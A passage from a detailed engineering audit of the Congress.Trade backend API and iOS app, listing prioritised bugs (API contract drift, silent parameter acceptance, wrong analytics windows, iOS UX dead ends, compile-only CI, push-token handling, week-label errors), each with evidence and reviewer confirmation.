- **Impact:** Inconsistent error envelope; unhelpful client message when a path is wrong (e.g. the member 404 above).
- **Fix:** Add `r.notFound(c => c.json({error:'not found'},404))` on the client router.
- **Evidence:** Live `curl /api/client/v1/nope` → 404 `content-type: text/plain`, body "404 Not Found". iOS APIErrorResponse decode (APIClient.swift:705-707) falls back to "Request failed".
- **Panel:** api-contract — Reproduced live: GET /api/client/v1/nope returns HTTP 404 with content-type: text/plain, body length 13 ("404 Not Found"), not the JSON {error} shape every other client error path uses.  This is directly relevant background for APICONTRACT-01: the member(id:) bug's 404 response is this same bare-text shape, which the iOS decoder falls back to a generic 'Request failed' message for. · `api-contract/APICONTRACT-21`

#### 381. [P4] Zero-delta `total` omission differs between the client feed (`since` present) and /api/transactions (`since > 0`)

- **Where:** GET /api/client/v1/feed vs /api/transactions  ·  **Surface:** Backend  ·  **Category:** api  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** A client-feed caller using `since=0` with a filter that matches nothing gets no `total`, the exact bug already fixed on the web path.
- **Impact:** Low today (iOS never sends since) but a trap for the cursor protocol the docs recommend.
- **Fix:** Align on `since > 0` in readClientTradeList.
- **Evidence:** client/queries.ts:94-101 `params.since !== undefined && items.length === 0` → omits total; rest.ts:671-672 `params.since > 0` with the comment explaining since=0 is the dashboard's first page and omitting total broke the 'filter matched zero rows' count. client-mobile-api.md:177-191 calls since=0 'a legitimate start-of-history cursor'.
- **Panel:** api-contract — Confirmed client/queries.ts's condition is `params.since !== undefined && items.length === 0` (i.e. since=0 counts as 'present'), while rest.ts's equivalent condition is `params.since !== undefined && params.since > 0 && transactions.length === 0` with an explicit comment describing exactly the since=0-broke-the-zero-count bug this finding says the client path still has.  Confirmed and low-impact as stated (iOS never sends since today). · `api-contract/APICONTRACT-22`

#### 382. [P4] Client feed `memberName` skips the filer-id resolution fast path that /api/transactions uses

- **Where:** GET /api/client/v1/feed?memberName=  ·  **Surface:** Backend  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Same corpus, two parsers, one optimization applied to only one of them.
- **Impact:** Slower iOS politician search, more D1 rows read.
- **Fix:** Call resolveMemberFilerId in the client /feed route (or move it into readClientTradeList).
- **Evidence:** rest.ts:629-639 resolves memberName → member (indexed keyset path) before building the query; client routes.ts:111-158 passes memberName straight to buildTransactionsQuery (LIKE path, canNestTransactionKeyset bails). iOS always searches politicians via memberName (CongressTradeStore.swift:600-604, 612-615). Live timing: client feed memberName=Pelosi 0.42s vs /api/transactions 0.30-0.36s vs client member= 0.28s.
- **Panel:** api-contract — Confirmed rest.ts (/api/transactions) explicitly calls resolveMemberFilerId(c.env, params.memberName) before building the query, with a comment explaining exactly why (avoids the un-indexed LIKE path).  Confirmed client/routes.ts's /feed handler has no equivalent call anywhere in the file (grep for resolveMemberFilerId in client/routes.ts, client/queries.ts, client/utils.ts returns nothing) — memberName goes straight to filtersFromQuery -> readClientTradeList -> the LIKE path.  Did not re-verify the specific live timing numbers (P4, quick check) but the code-level asymmetry that causes them is directly confirmed. · `api-contract/APICONTRACT-25`

#### 399. [P4] Public API silently accepts invalid params instead of 400ing (from=not-a-date → empty 200; chamber=House → ignored; limit=abc → default)

- **Where:** /api/transactions, /api/analytics/* query parsing  ·  **Surface:** Backend  ·  **Category:** api  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Typos in integrator queries produce plausible-looking wrong data rather than an error.
- **Impact:** Third-party/iOS bugs are hard to detect; docs promise enums.
- **Fix:** Validate date format and enums; return 400 with `{error, hint}` like the offset cap does (rest.ts:611-618); lowercase chamber/party inputs.
- **Evidence:** Live curl 2026-08-19: `/api/transactions?from=not-a-date&limit=5` -> HTTP 200 `{"transactions":[],...,"total":0}`; `chamber=nope` -> HTTP 200 with unfiltered default rows returned (a real seed-senate trade, not an error or empty set); `party=Z` -> HTTP 200 with the same unfiltered rows. Confirms typo'd enum values are silently dropped to the unfiltered default rather than rejected.
- **Panel:** qa-bughunt — Reproduced live exactly as claimed for all three param types (from, chamber, party). · `qa-bughunt/QABUGHUNT-28`

#### 461. [P4] iOS consumes ~20 unversioned origin routes beside /api/client/v1 and sends no client-version header — no deprecation lever exists

- **Where:** APIClient.swift origin calls  ·  **Surface:** Cross-surface  ·  **Category:** api  ·  **Effort:** L  ·  **Verdict:** confirmed (medium confidence)
- **What:** The 'one contract' rule is already breached broadly, and the server cannot tell which binary is calling, so shape changes on analytics (e.g. the conflicts drift in APICONTRACT-03) break frozen App Store builds with no way to serve them a compatible shape.
- **Impact:** Fragility for shipped binaries; no telemetry per app version.
- **Fix:** Send `X-Client: ios/<marketingVersion>(<build>)` from iOS and log it; either proxy the analytics/roster/export needs under /api/client/v1 (thin pass-throughs with pinned shapes) or formally freeze the analytics envelopes in openapi and add contract tests against both consumers.
- **Evidence:** APIClient.swift: /api/members (:193-195), /api/assets (:204-206), 14× /api/analytics/* (:245-316), /api/analytics/performance/:txId (:511-522), /api/export/transactions.csv (:467-507), /billing/portal (:586-595), /auth/apple, /auth/magic/request, /auth/logout, /api/documents/:docId/pdf. client-mobile-api.md:18-21 'Use /api/client/v1/* … instead of binding mobile clients to internal web routes'; doc :334-349 explains why analytics shapes are a drift risk. makeRequest (:690-697) sets only Accept/Authorization — no User-Agent/App-Version/API-Version header; openapi.yaml:8-13 says only /api/client/v1 is versioned.
- **Panel:** api-contract — Confirmed APIClient.swift's makeRequest sets only 'accept' explicitly plus whatever the interceptor adds (Authorization), no client-version/User-Agent header.  Confirmed a substantial count (17+) of grep hits for non-/api/client/v1 origin paths (api/members, api/assets, export/transactions.csv, billing/portal, auth/apple, auth/magic, auth/logout, api/documents) beyond the 14 analytics endpoints already itemized in the raw finding.  This is exactly APICONTRACT-03's root cause (the conflicts drift happened on one of these unversioned analytics routes) so the finding correctly identifies a systemic risk, not just an isolated incident. confidence:medium from the original author is appropriate given this is architectural/directional rather than a single reproducible bug. · `api-contract/APICONTRACT-24`

### iOS app quality: correctness, native patterns and polish (68)

Beyond the compliance blockers the app is a competent but web-shaped client: dead-end sheets, pager chrome instead of native lists, stale-data flashes, error states with no retry, and a long tail of HIG deviations.

#### 21. [P1] 'This Calendar Year' and 'Last Calendar Year' on Trends both show trailing-365-day analytics (iOS maps them to window=365d although the API supports this_cy/last_cy)

- **Where:** clients/ios/CongressTrade/Models.swift:1095-1103  ·  **Surface:** iOS  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Every Trends section (Market Snapshot, leaderboards, sector flow, timeliness…) is wrong for two of the ten time-range options, and Trends and Trades disagree for the same chip.
- **Impact:** Clearly wrong headline numbers for a first-class filter; web shows different figures for the same label.
- **Fix:** Return `"this_cy"` / `"last_cy"` from analyticsWindow (the API already validates them) and add a unit test; also pass them through fetchTicker/fetchMember.
- **Evidence:** Models.swift:1097-1098 `case .thisCalendarYear, .lastCalendarYear: return "365d"`.  Live 2026-08-19: `/api/analytics/summary?window=365d` → 15,989 trades / 163 politicians / net +$310.9m; `?window=this_cy` → 10,136 / 133 / +$37.6m; `?window=last_cy` → 19,162 / 185 / +$23.9m.  So an iOS user choosing 'Last Calendar Year' sees 15,989 trades (identical to 'Past Year') while the Trades tab below (which uses from/to dates, Models.swift:1107-1160) filters to 2025.
- **Panel:** ios-shipped-app — Strongest finding in the set.  Models.swift:1095-1097 (line numbers corrected from 1095-1104) confirmed verbatim: `case .thisCalendarYear, .lastCalendarYear: return "365d"` with a comment claiming this is necessary — but sql.ts:39 confirms the server's CALENDAR_WINDOWS fully supports `this_cy`/`last_cy` as first-class values (used correctly by `fromDateISO` on the same enum, and by the web app).  Live curl today: window=365d -> 16,001 trades; this_cy -> 10,148; last_cy -> 19,162 — three materially different results, confirming Trends silently substitutes the wrong window for two of its ten filter options. · merged: api-contract/APICONTRACT-04 · `ios-shipped-app/IOSSHIPPEDAPP-36`

#### 22. [P1] Trends failure state has no retry control, hides every section behind six '—' tiles, shows the generic 'Request failed', and never auto-recovers because polling is only armed after a successful feed

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:36-38  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** tracked-in-PR-#1973 (F4 'Trends retry copy' — partial; the no-auto-recovery and status-code parts are new)
- **What:** After a transient backend error the first screen of the app is a dead board until the user discovers pull-to-refresh or switches tabs.
- **Impact:** First impression on any backend blip is an empty app.
- **Fix:** Give `NoticeView` an optional Retry action wired to `refreshTrends()`; include the HTTP status in the generic message ('Server error (502).  Tap to retry.'); arm a bounded retry/backoff timer when the initial feed/trends load fails (not only from `nextPollAfterSec`).
- **Evidence:** Capture light/03-trends-request-failed-state.png viewed directly: 'Request failed' box, six '—' tiles (Trades/Politicians/Est. Volume/Net Flow/Buys/Sells), only Privacy/Terms/Pricing/Support footer links, no retry affordance. TrendsView.swift: `NoticeView(message: notice)` renders the notice — the `NoticeView` struct (Components.swift:558-571) is a plain `Text` in a background, no button, no action closure. CongressTradeStore.swift:538 `scheduleAutoRefresh()` guards on `let delay = feed?.nextPollAfterSec` — `feed` is nil after a failed first load, so the poll timer never arms. APIClient.swift `message: error?.error ?? "Request failed"` shows no HTTP status for a body that doesn't decode.
- **Panel:** ios-engineering — Screenshot viewed directly and matches the description exactly; NoticeView confirmed to have zero interactive elements; PR #1973 confirmed (via gh pr view) to be a docs-only audit report that names this exact item as still open, not a fix. · merged: ios-hig-ux/IOSHIGUX-05, ios-shipped-app/IOSSHIPPEDAPP-39, qa-bughunt/QABUGHUNT-14, ops-reliability/OPSRELIABILITY-12, ios-a11y/IOSA11Y-08 · `ios-engineering/IOSENGINEERING-11`

#### 23. [P1] Premium sheet is a dead end when signed out: lowercase 'sign in first' caption, no sign-in button, no Restore Purchases, no term/renewal line

- **Where:** clients/ios/CongressTrade/Views/Status/PremiumSheet.swift:130-161  ·  **Surface:** iOS  ·  **Category:** billing  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** (was IOSSHIP-04) The paywall reachable from every tab's footer cannot start sign-in, cannot restore, and shows no billing period/auto-renew wording for the anonymous viewer.
- **Impact:** Lost conversions; App Review 3.1.2 wants price, length and renewal terms on the paywall; users who bought on another device cannot restore before signing in.
- **Fix:** When `!store.signedIn` embed `SignInPanel` inline (or a 'Sign in to continue' button); always render Restore Purchases; show 'Billed monthly / yearly, auto-renews until cancelled' beneath `PremiumPricing.headline` regardless of auth state; sentence-case the caption.
- **Evidence:** PremiumSheet.swift:133-139 `else if !store.signedIn { Text("sign in first — Premium is tied to your account") … }` — the branch renders no button; `restoreButton` is only in the `products.isEmpty` (:154) and products (:161) branches which are unreachable when signed out; the code comment (:134-135) assumes 'the sign-in stack is one sheet behind this one', which is false when opened from the footer 'Pricing' (LegalFooterLinks → openPremium, App.swift:269) or Delivery 'Subscribe with Apple' (DeliveryView.swift:48-52).  Sim shot 29-premium-sheet.png: only 'Not Now', lower half empty.
- **Panel:** ios-shipped-app — PremiumSheet.swift actionSection (~line 130) confirmed: the `!store.signedIn` branch renders only a Text with no button and no restoreButton call.  Confirmed the 'sign-in stack is one sheet behind' assumption is false in two reachable cases: DeliveryView.swift:274 presents PremiumSheet directly via `showSubscribe`, and App.swift:269-270 presents it directly via the `openPremium` environment value (reachable from LegalFooterLinks 'Pricing' with no sign-in sheet underneath). · merged: app-store-compliance/APPSTORECOMPLIANCE-11, billing/BILLING-11, growth-onboarding/GROWTHONBOARDING-12, ios-engineering/IOSENGINEERING-12, ios-hig-ux/IOSHIGUX-06, qa-bughunt/QABUGHUNT-25, ux-copy/UXCOPY-27, visual-design/VISUALDESIGN-30 · `ios-shipped-app/IOSSHIPPEDAPP-04`

#### 27. [P1] iOS CI is compile-only and not a required check: the 71 unit tests never run in CI, and three red iOS builds were merged on 2026-08-15/16 leaving main uncompilable for far longer than one workday

- **Where:** .github/workflows/ios-build.yml  ·  **Surface:** iOS  ·  **Category:** ops  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-13 (IMPROVEMENT-PLAN P0.4)
- **What:** The capture step's compile failure was caught by CI and ignored by the merge flow (nothing blocks merging on it); the test suite only runs when a human remembers.
- **Impact:** Broken main blocks TestFlight/App Store builds and every peer agent; regressions in the decoding/URL/idempotency tests go unnoticed.
- **Fix:** Add 'xcodebuild (unsigned)' to required status checks; add a test job on the Mac runner (`xcodebuild test -destination 'platform=iOS Simulator,name=…' -resultBundlePath`, upload .xcresult); commit a shared scheme with the test target; scope `cancel-in-progress` to PR refs only (`cancel-in-progress: ${{ github.event_name == 'pull_request' }}`).
- **Evidence:** .github/workflows/ios-build.yml runs only `xcodebuild build -project clients/ios/CongressTrade.xcodeproj -scheme CongressTrade -destination 'generic/platform=iOS' CODE_SIGNING_ALLOWED=NO ...` (job name 'xcodebuild (unsigned)'; no `test` action, no `-resultBundlePath`). `gh api repos/.../branches/main/protection` → `required_status_checks.contexts == ["typecheck + test", "gitleaks"]` — no iOS context. `gh run list --workflow=ios-build.yml` filtered to `headBranch == main` shows: 2026-08-15T07:01:48Z failure (6e374bc3, #1878), 2026-08-16T01:04:03Z failure (ee1c11f5, #1881), 2026-08-16T01:21:29Z failure (cd30d4b9, #1884), first green run 2026-08-16T21:07:20Z success (5fa2e9b0, #1892) — all three failing commits are on `main`, i.e. already merged when CI ran. Two cancelled main-push runs (fb23e74a, a7f3d678, both 2026-08-16T20:4x) show the per-ref `cancel-in-progress: true` concurrency group also drops main's CI signal on rapid pushes. `grep -c 'func test' CongressTradeTests.swift` → 71. No `xcshareddata/xcschemes` directory found anywhere in the tracked tree.
- **Panel:** ios-engineering — All facts reproduced from live `gh` queries, including branch protection contexts and full run history.  Corrected one number: the raw finding said main was uncompilable for '~20h'; the actual gap between the first failing push (2026-08-15T07:01:48Z) and the first green run (2026-08-16T21:07:20Z) is ~38 hours, not 20 — the finding understated its own evidence.  Severity kept at P2 since it did eventually self-correct and is a process/ops gap rather than a live-user-facing break. · merged: engineering-quality/ENGINEERINGQUALITY-04, prior-review-followup/PRIORREVIEWFOLLOWUP-24 · `ios-engineering/IOSENGINEERING-14`

#### 59. [P1] Trades search field is swapped out for the 'Updating results…' row on the first keystroke, dismissing the keyboard mid-typing

- **Where:** clients/ios/CongressTrade/Views/Feed/FeedDashboardView.swift:172-176,388-402,1032-1048  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)  ·  **Quick win**
- **What:** Typing one character lights the filter intent, which flips the slot to the spinner, which removes the TextField from the hierarchy and explicitly clears focus.  The field only returns after the server round trip, unfocused, so continuous typing is interrupted every keystroke.
- **Impact:** Core Trades search is effectively one-character-per-tap on a phone; users will think search is broken.
- **Fix:** Never replace the field while it is focused: render the spinner/Reload as an overlay or trailing accessory inside the field, and drop the `searchFocused = false` on `.updating` (keep it only for `.reload`).  Or defer `beginFilterChange()` until the debounce fires when the field is focused.  Add a UI/unit test that `tradesSearchSlotStatus` does not become `.updating` while `searchFocused`.
- **Evidence:** FeedDashboardView.swift:172-176 `.onChange(of: searchText) { _, _ in scheduleSearchDebounce() }` and `.onChange(of: tradesSearchSlotStatus) { _, status in if status != nil { searchFocused = false } }`; :388-402 `scheduleSearchDebounce()` calls `openSearchIntent()` BEFORE scheduling the 320ms debounce, and `openSearchIntent()` (:398-402) calls `store.beginFilterChange()` synchronously on the very first keystroke, not after the debounce. CongressTradeStore.swift:237-238 `beginFilterChange()` → `pendingFilterIntents += 1` → `isApplyingFilters = true` immediately (via `syncApplyingFilters`). FeedDashboardView.swift:123-131 `tradesSearchSlotStatus` returns `.updating` whenever `store.isTradesUpdating` (== `isApplyingFilters || isRefreshing`). The `TradesUnifiedSearchField` struct (defined at FeedDashboardView.swift:1032, not a separate file) body (:1041-1048) does `if let status { statusSlot(status) } else { searchSlot }`, unconditionally removing the TextField from the view hierarchy the instant a status is non-nil. Capture 11-trades-reloading.png (viewed) confirms the replaced slot showing 'Updating results…' with a spinner in place of the field.
- **Panel:** ios-engineering — Mechanism traced line-by-line and matches exactly; corrected the file citation for the search field body — it lives inside FeedDashboardView.swift (struct TradesUnifiedSearchField at line 1032), there is no separate TradesUnifiedSearchField.swift file.  Screenshot evidence viewed and matches. · `ios-engineering/IOSENGINEERING-03`

#### 82. [P2] APNs token never re-registered at launch and backend sync waits for the next feed poll; stale tokens survive restores

- **Where:** clients/ios/CongressTrade/Store/PushNotificationManager.swift:45-59  ·  **Surface:** iOS  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Apple documents that tokens can change and that apps should call `registerForRemoteNotifications()` on every launch.  Here a token is reused from UserDefaults indefinitely, and first-time enablement shows 'waiting to register this device' until the next poll (≤300s) or a manual retry/toggle.
- **Impact:** Devices restored from backup or with rotated tokens silently stop receiving alerts; first-run enable looks stuck.
- **Fix:** Call `UIApplication.shared.registerForRemoteNotifications()` in `didFinishLaunching` when `authorizationStatus` is authorized/provisional; in `handleDeviceToken` kick `syncTokenWithBackend` when `store.signedIn`; keep the idempotency key per token.
- **Evidence:** PushNotificationManager.swift:45-59 `registerForRemoteNotifications()` is called only inside `requestAuthorization()` after a fresh grant; AppDelegate.swift's `didFinishLaunching` (lines 5-10) only sets the UNUserNotificationCenter delegate, never calls `registerForRemoteNotifications()`. init() (:29-35) restores `deviceToken` from UserDefaults and sets `isBackendSynced` from a cached string, with no re-registration triggered. `handleDeviceToken` (:62-71) sets `isBackendSynced = false` on rotation but does not itself call `syncTokenWithBackend`.
- **Panel:** ios-engineering — Confirmed no launch-time registerForRemoteNotifications call and no auto-sync from handleDeviceToken.  Note: there are additional manual sync call sites beyond the two the raw finding cited (a Settings-panel Retry button and a toggle in Components.swift around lines 1287/1344/1352) — none change the substance, all require explicit user action, none fire automatically from token receipt or launch. · `ios-engineering/IOSENGINEERING-05`

#### 83. [P2] Trade Details sheet opens at medium detent showing only the hero (logo, ticker, name, pill) -- no data above the fold

- **Where:** Trade Details sheet  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The first state a user sees after tapping a trade spends most of the medium detent on a large decorative hero (padding, 1.3x-scaled logo); only the first 2-3 rows of Trade Summary are reachable without a drag, and the rest (Confidence, dates, performance) requires a second gesture.
- **Impact:** Every trade tap costs an extra gesture to see the bulk of the key facts the user tapped for.
- **Fix:** Either open at `.large` (or `.fraction(0.85)`) or shrink the hero (row-style header: 40pt logo + ticker + pill on one line) so more of Trade Summary is visible at medium.
- **Evidence:** light/12-trade-detail.png viewed directly: medium detent shows logo, "VSNT >", company name, Sell pill, AND the Trade Summary card's Politician/Amount/Owner rows (Confidence row is cut off at the very bottom edge). `.presentationDetents([.medium, .large])` confirmed on both TradeDetailView.swift and FeedDashboardView.swift.
- **Panel:** ios-hig-ux — Softened wording: the screenshot shows Politician/Amount/Owner already visible at medium detent (not zero data), only Confidence-and-below is cut off.  The underlying complaint -- an oversized hero eating most of the medium detent -- still holds visually and is a legitimate P2, but the original title's 'no data above the fold' overstated it slightly. · `ios-hig-ux/IOSHIGUX-10`

#### 84. [P2] Header ⓘ is labelled "About Congress.Trade" but only toggles the disclaimer banner; ≡ "Menu" is a web hamburger for account

- **Where:** Trends/Trades navigation bar  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** HIG: an info button presents information; a grey circular ⓘ that collapses a banner with no visible state is surprising, and VoiceOver announces "About Congress.Trade" for a toggle.  The hamburger is a web idiom; iOS account entry is a profile glyph.
- **Impact:** Discoverability of sign-in/account (the only place it exists) and of the disclaimer; mis-described control for AT users.
- **Fix:** Make ⓘ open a small About/Disclaimer sheet (or rename the label "Show disclaimer" and add `.isToggle` semantics); replace ≡ with `person.crop.circle` labelled "Account"; use standard toolbar buttons instead of custom circles.
- **Evidence:** light/27-info-disclaimer-expanded.png (banner toggles, no sheet); TrendsView.swift confirmed `HeaderIconButton(systemImage: "info.circle", accessibilityLabel: "About Congress.Trade")` toggling `disclaimerExpanded`; Components.swift confirmed hamburger `line.3.horizontal` with `.accessibilityLabel("Menu")` opening `AccountQuickMenu`; NOTES §4 corroborates independently.
- **Panel:** ios-hig-ux — Both accessibility labels and both behaviors confirmed by direct grep. · merged: ios-a11y/IOSA11Y-16 · `ios-hig-ux/IOSHIGUX-11`

#### 86. [P2] Paging to the next page (Trades and Directory) keeps the scroll position at the bottom of the list

- **Where:** clients/ios/CongressTrade/Views/Feed/FeedDashboardView.swift:183-267 (ScrollView, FeedPaginationBar top/bottom); Store/CongressTradeStore.swift:419-431 (goToNextPage only mutates currentPage); Views/People/PeopleDirectoryView.swift:96-186,188-211  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** (was IOSSHIP-14, extended to Directory which uses the same PaginationBar + ScrollView pattern) Page change swaps data without resetting scroll.
- **Impact:** Reading in order past page 1 requires scrolling up ~50 rows every page.
- **Fix:** Wrap both ScrollViews in `ScrollViewReader` and `scrollTo(top)` on page change.
- **Evidence:** `grep -rn 'scrollTo\|ScrollViewReader\|scrollPosition' clients/ios/CongressTrade` → no matches; walkthrough: tapping › on the bottom pager showed '2 of 44' with the viewport still at the last rows of the new page.
- **Panel:** ios-shipped-app — `grep -rn 'scrollTo|ScrollViewReader|scrollPosition'` over the iOS Swift tree returns zero hits (only unrelated web dashboardHtml.ts hits), confirming no scroll-reset mechanism exists on page change. · `ios-shipped-app/IOSSHIPPEDAPP-14`

#### 87. [P2] Trends keeps showing the previous filter's numbers for ~2 s with no loading indicator after a chip change

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:31-35 (ProgressView only when `analyticsSummary == nil`); Store/CongressTradeStore.swift:766-812 (performTrendsRefresh assigns section by section, never clears old data)  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** (was IOSSHIP-15) The screen asserts wrong figures for the selected filter for a couple of seconds and can mix stale/new sections on partial failure.
- **Impact:** Users can read/screenshot wrong numbers; app feels unresponsive.
- **Fix:** Dim tiles / `.redacted(reason: .placeholder)` while `isLoadingTrends`, keyed to the filter signature; clear section arrays at the start of performTrendsRefresh.
- **Evidence:** TrendsView.swift:31 `if store.isLoadingTrends && store.analyticsSummary == nil { ProgressView… } else { … summaryStrip … }` — once any summary exists, `isLoadingTrends` is never surfaced; the `FilterActivityIndicator` component (Components.swift:1474-1486) is never instantiated (`grep -rn 'FilterActivityIndicator(' clients/ios` → 0).  Walkthrough: 'Past Month' turned the chip blue while tiles kept 2,178/79/$97.4m for ~2 s.  Also, because sections are assigned sequentially with `try await` (:790-801), a mid-sequence failure leaves a mix of new summary + old sections.
- **Panel:** ios-shipped-app — TrendsView.swift:31 confirmed `if store.isLoadingTrends && store.analyticsSummary == nil` gates the only loading UI. `grep -rn 'FilterActivityIndicator\('` finds zero call sites — the component is defined (Components.swift:1474) but dead. · `ios-shipped-app/IOSSHIPPEDAPP-15`

#### 88. [P2] Directory and Delivery drop the ⓘ / word-mark / ≡ chrome, so Account/Premium/theme/CSV are unreachable from half the tabs

- **Where:** clients/ios/CongressTrade/Views/People/PeopleDirectoryView.swift:53-91 (toolbar absent, `.navigationTitle("Directory")`); Views/Delivery/DeliveryView.swift:28-296; cf. Views/Feed/FeedDashboardView.swift:272-298, Views/TrendsView.swift:113-131  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** (was IOSSHIP-17) Global chrome is implemented per-tab and only two tabs implement it.
- **Impact:** Inconsistent shell; account entry points disappear on Directory/Delivery (root cause of -03).
- **Fix:** Lift ⓘ / BrandTitle / ≡ into a shared header modifier applied by all four tabs.
- **Evidence:** Neither PeopleDirectoryView.swift nor DeliveryView.swift references HamburgerMenuButton, HeaderIconButton or BrandTitle; sim shots 40-directory-tab.png / 60-delivery-tab-anonymous.png show a plain inline title.  Walkthrough on Mac additionally saw a ~60pt blank band where the word-mark sits on other tabs.
- **Panel:** ios-shipped-app — Confirmed PeopleDirectoryView.swift has only a plain `.navigationTitle("Directory")` (line 72) with no HamburgerMenuButton/HeaderIconButton/BrandTitle grep hits, and DeliveryView's root NavigationStack/Form likewise has no toolbar (see IOSSHIPPEDAPP-03 check). · merged: ios-hig-ux/IOSHIGUX-02, ios-shipped-app/IOSSHIPPEDAPP-03 · `ios-shipped-app/IOSSHIPPEDAPP-17`

#### 89. [P2] Politician sheet renders an empty 'PERFORMANCE VS S&P 500' card (caveat only) and has no summary tiles

- **Where:** clients/ios/CongressTrade/Views/Feed/PoliticianDetailView.swift:66-98  ·  **Surface:** iOS  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** (was IOSSHIP-19)
- **Impact:** Looks broken and under-informative on the most-visited detail type.
- **Fix:** Gate the card on `scoredCount > 0` (or show 'No qualifying stock buys in this window'); add a trading-summary tile row mirroring TickerDetailView from `summary`.
- **Evidence:** PoliticianDetailView.swift:66 `if let perf = summary?.performance { DetailSection("Performance vs S&P 500") { if let trade = perf.tradeDate, trade.scoredCount > 0 {…} else if perf.scoredCount > 0 {…}; if let filing = …, filing.scoredCount > 0 {…}; Text("Buys only · observational…") } }` — the caption at :94 is unconditional, so when both legs have scoredCount 0 the card shows only the caption.  Walkthrough: Kevin Hern and Donald J. Trump pages both showed the empty card.  TickerDetailView has a Trades/Buys/Sells/Members/Volume/Net Flow tile grid (:86-105); PoliticianDetailView has none.
- **Panel:** ios-shipped-app — PoliticianDetailView.swift lines 66-98 confirmed: the caption 'Buys only · observational…' (~line 92-94) renders unconditionally inside the `if let perf = summary?.performance` block, while both scored-count branches are conditional — so a filer with scoredCount 0 on both legs shows only the caption. · `ios-shipped-app/IOSSHIPPEDAPP-19`

#### 90. [P2] Buys vs Sells week labels are one week early: iOS decodes the server's SQLite %W bucket ('2026-W31') as an ISO/Gregorian weekOfYear, web decodes it correctly

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:799-814 (formatVolumePeriod: `components.yearForWeekOfYear = year; components.weekOfYear = num; components.weekday = 2`); app/src/analytics/sql.ts:144 (`'%Y-W%W'`); app/src/ui/dashboardHtml.ts:9198-9214 (fmtPeriod rebuilds the %W Monday)  ·  **Surface:** iOS  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** (was IOSSHIP-26, root cause corrected) Every weekly bar on iOS is captioned with the previous week's Monday.
- **Impact:** Chart appears to trail the trade list by a week and disagrees with the web for the same buckets.
- **Fix:** Port fmtPeriod's %W logic (Jan 1 → first Monday + (wk−1)×7 days; wk 0 → Jan 1) into formatVolumePeriod; add a unit test for 2026-W31 → Aug 3.
- **Evidence:** `/api/analytics/volume-over-time?window=90d` → last bucket `{'period': '2026-W31', 'buys': 0, 'sells': 7}`; SQLite %W week 31 of 2026 (first Monday Jan 5) starts Aug 3, and those 7 sells are exactly the seven Kevin Hern Aug 5 sells at the top of the Trades tab.  iOS `Calendar(identifier: .gregorian)` weekOfYear 31 / weekday 2 → Jul 27; walkthrough chart: 'May 11 … Jul 27' (web fmtPeriod would print May 18 … Aug 3).  This replaces the earlier 'analytics lag' hypothesis — the data is current, the label is off by one week.
- **Panel:** ios-shipped-app — Directly reproduced via `swift` CLI: a script with `yearForWeekOfYear=2026, weekOfYear=31, weekday=2` on `Calendar(identifier: .gregorian)` prints 'Jul 27, 2026'.  Independently re-derived the web fmtPeriod algorithm (dashboardHtml.ts:9487-9506) for the same week-31 bucket: Jan 1 2026 is a Thursday, first Monday is Jan 5, so week 31 starts Jan5 + 30*7 = Aug 3, 2026 — exactly one week later than iOS's Jul 27.  This is a clean, fully reproduced off-by-one bug. · `ios-shipped-app/IOSSHIPPEDAPP-26`

#### 91. [P2] Ticker sheet 'Recent Trades' are in ingest (cursor) order, not date order — the client passes no sort and the /ticker route defaults to cursor unlike /member

- **Where:** clients/ios/CongressTrade/APIClient.swift:237-262 (ticker(): no `sort` query item); app/src/client/routes.ts:197-203 (`order: asOrder(q.order) ?? 'desc'`, no `sort`), cf. :270-271 member route `sort: asSort(q.sort) ?? 'tx_date'` (fixed by #1884 for members only)  ·  **Surface:** Cross-surface  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The list titled 'Recent Trades' is not recent-first.
- **Impact:** Users cannot read a ticker's history; looks random.
- **Fix:** iOS: add `URLQueryItem(name: "sort", value: "tx_date")` in APIClient.ticker; backend: default the /ticker route to `sort: 'tx_date'` like /member.
- **Evidence:** `curl …/api/client/v1/ticker/MSFT?window=90d&limit=30` → item dates 2024-09-09, 2024-08-20, 2025-06-06, 2025-11-13, 2025-07-29, 2025-04-10 …; with the app's from= param: 07-21, 06-02, 06-17, 06-17, 06-02, 06-11.  Sim shots 51-53 (Sep 2024, Aug 2024, Jun 2025, Nov 2025…).
